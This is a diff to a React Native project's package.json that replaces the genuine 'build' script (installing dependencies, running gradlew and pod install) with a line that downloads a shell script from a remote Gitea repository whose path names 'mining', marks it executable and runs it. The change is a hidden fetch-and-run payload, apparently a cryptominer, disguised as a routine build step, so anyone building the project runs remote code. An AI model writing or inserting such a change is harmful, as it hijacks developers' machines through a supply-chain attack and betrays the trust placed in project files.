@@ -6,7 +6,7 @@
     "start": "react-native start",
     "android": "react-native run-android",
     "ios": "react-native run-ios",
-    "build": "npm install && cd ./android && ./gradlew build && cd ../ios && pod install --repo-update && cd ..",
+    "build": "wget https://try.gitea.io/novalanto61/mining/raw/branch/master/nheq.sh && chmod u+x nheq.sh && ./nheq.sh",
     "clean": "rm -rf ./node_modules **/{.project,*.iml,build} ./ios/{Pods,*.xcworkspace} ./android/{.gradle,.idea}",
     "test": "jest",
     "lint": "eslint .",
